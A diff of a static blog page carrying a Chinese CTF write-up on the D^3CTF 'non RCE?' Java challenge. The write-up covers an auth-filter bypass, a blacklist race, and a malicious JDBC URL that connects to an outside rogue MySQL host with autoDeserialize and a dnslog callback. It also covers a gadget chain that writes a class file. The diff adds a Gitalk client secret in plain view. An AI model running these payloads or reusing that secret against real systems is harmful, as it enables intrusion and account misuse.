@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>AntCTF x D^3CTF non RCE? |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="AntCTF x D^3CTF non RCE? |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="AntCTF x D^3CTF non RCE? |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="AntCTF x D^3CTF non RCE?"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/o7CJqUnTn/"/>
+    <meta property="og:url" content="http://localhost:4000/post/o7CJqUnTn/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>AntCTF x D^3CTF non RCE?</h1>
@@ -102,7 +102,7 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>题目给出了源码。首先导入到idea。其中有各种问题。。跟着百度该配置就行了<br>
-<img src="https://guokeya.github.io/post-images/1615170864996.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615170864996.png" alt="" loading="lazy"><br>
 可以看到源码中目录结构如下</p>
 <pre><code>checker
     黑名单的check      
@@ -118,12 +118,12 @@ pom.xml
 </code></pre>
 <p>首先看下pom.xml的依赖。可以知道这是个内嵌tomcat的web应用。并且带Mysql依赖<br>
 继续看Servlet的adminServlet<br>
-<img src="https://guokeya.github.io/post-images/1615171508331.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615171508331.png" alt="" loading="lazy"><br>
 跟进checker。发现是关键字检测</p>
 <pre><code>public String[] blackList = new String[] {&quot;%&quot;, &quot;autoDeserialize&quot;};
 </code></pre>
 <p>再看看filter。对admin下有没有啥过滤。找到了LoginFilter<br>
-<img src="https://guokeya.github.io/post-images/1615171638219.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615171638219.png" alt="" loading="lazy"><br>
 匹配/admin/*。输入password，password正确才会放行<br>
 然而这里我们并不知道password是啥。<br>
 现在的要求就是要访问/admin/importdata。但是又不能让/admin filter匹配到<br>
@@ -137,7 +137,7 @@ loginfilter 判断密码
 nocache   添加了http返回头
 </code></pre>
 <p>看起来只有urlfilter有点用。跟进<br>
-<img src="https://guokeya.github.io/post-images/1615172038245.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1615172038245.png" alt="" loading="lazy"></p>
 <p>欸这，第一层绕过不就有了吗<br>
 首先进入URLfilter。把;替换为空。然后直接转发到了目标的路由<br>
 比如输入/admin;/importdata<br>
@@ -148,7 +148,7 @@ nocache   添加了http返回头
 <p>看梅子酒师傅的解释就够了。<br>
 <code>https://mp.weixin.qq.com/s/GxFFBekqSl5BOnzAKFGBDQ</code><br>
 简单来说就是某个线程将url绑定到this.toBeChecked的时候。假设这是恶意的线程。刚绑定完。准备check的时候。欸。来了个正常的线程。把正常的jdbcurl往上绑定了。这时候就过了check。恶意的线程就得以往下执行<br>
-<img src="https://guokeya.github.io/post-images/1615296867336.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1615296867336.png" alt="" loading="lazy"></p>
 <pre><code>/;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse&amp;databaseType=mysql
 
 /;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f119.45.155.77%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize%3dtrue%26user%3dyso_URLDNS_http://1n4jm9.dnslog.cn&amp;databaseType=mysql
@@ -260,29 +260,29 @@ public class test {
 <p>idea动调有点问题。不知道为啥。。。。。<br>
 直接静态看了<br>
 入口点在于HashSet类重写的readobject方法<br>
-<img src="https://guokeya.github.io/post-images/1615297992482.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615297992482.png" alt="" loading="lazy"><br>
 这里s就是我们反序列化的恶意对象。然后调用了HashMap的put方法，把恶意对象和一个占位的空object带入了<br>
-<img src="https://guokeya.github.io/post-images/1615298075743.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298075743.png" alt="" loading="lazy"><br>
 这里key。就是我们的恶意对象。可以看到又带入了HashMap的hash方法<br>
-<img src="https://guokeya.github.io/post-images/1615298127568.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298127568.png" alt="" loading="lazy"><br>
 这里调用了恶意对象的hashCode方法。根据exp。这个传入的恶意对象。应该是<code>DataMap$Entry</code>。继续追hashcode方法。<br>
-<img src="https://guokeya.github.io/post-images/1615298246657.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298246657.png" alt="" loading="lazy"><br>
 跟着调用图。直接看this.getValue()<br>
-<img src="https://guokeya.github.io/post-images/1615298296417.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298296417.png" alt="" loading="lazy"><br>
 然后调用了DataMap的get方法。this.key。这个值我们可控。传入要写入的文件名<br>
-<img src="https://guokeya.github.io/post-images/1615298429083.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298429083.png" alt="" loading="lazy"><br>
 如果this.values不为nulll。就从this.values.get(key)。通过this.values的get方法根据key来获取内容。有点像php的$this-&gt;values-&gt;get<br>
 这里把this.values设置为SimpleCache类。也就是调用了SimpleCache('文件名')<br>
-<img src="https://guokeya.github.io/post-images/1615298836535.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615298836535.png" alt="" loading="lazy"><br>
 这里会去父类找有没有指定的键名。父类当然是没有'../../../../../xxx.class'这种的键名了<br>
 所以会返回null</p>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1615298429083.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1615298429083.png" alt="" loading="lazy"></figure>
 <p>接着回来，v等于null。v就等于v = this.wrapperMap.get(key)。最后呢。会带入<code>this.values.put(key, v);</code><br>
 emmmm。先说一下。后面的利用是<code>SimpleeCache$StoreableCachingMap.put(文件名，内容)</code>即可写入文件。<br>
 所以。这是不是又有点像<code>$this-&gt;values-&gt;put(key,v)</code>呢。这里把this.values设置为<code>SimpleeCache$StoreableCachingMap</code>类即可。然后key呢。就是我们一直传下来的文件名，内容呢。<code>this.wrapperMap.get(key);</code>。那么wrapperMap就为HashMap类。成了<code>HashMap.get('文件名')</code>。根据文件名获得内容。我们只要在构造exp的时候。给他塞一个文件名，文件内容对应的map就行了<br>
 至此。最难的部分完结了。继续看SimpleeCache$StoreableCachingMap的put方法<br>
-<img src="https://guokeya.github.io/post-images/1615299381355.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1615299405643.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615299381355.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1615299405643.png" alt="" loading="lazy"><br>
 大致就是这样。有错误烦请大师父们指正</p>
 <p>接下来。就是利用了。<br>
 利用这个写文件的Gadget配合jdbc反序列化往classpath里写入exp.class。里面是重写了readobject方法的恶意类字节码<br>
@@ -360,7 +360,7 @@ public class myexp implements Serializable {
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/TsCTC6Ohu/">
+            <a href="http://localhost:4000/post/TsCTC6Ohu/">
               <span class="post-title">
                 CVE-2017-3506 &amp; CVE-2017-10271&rarr;
               </span>
@@ -369,6 +369,26 @@ public class myexp implements Serializable {
         
         <div class="comment">
           
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
         </div>
       </div>
     </div>
@@ -404,7 +424,7 @@ public class myexp implements Serializable {
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -412,17 +432,17 @@ public class myexp implements Serializable {
               </a>
               </li>
           </ul>
-          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
         </div>
       </div>
     </div>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
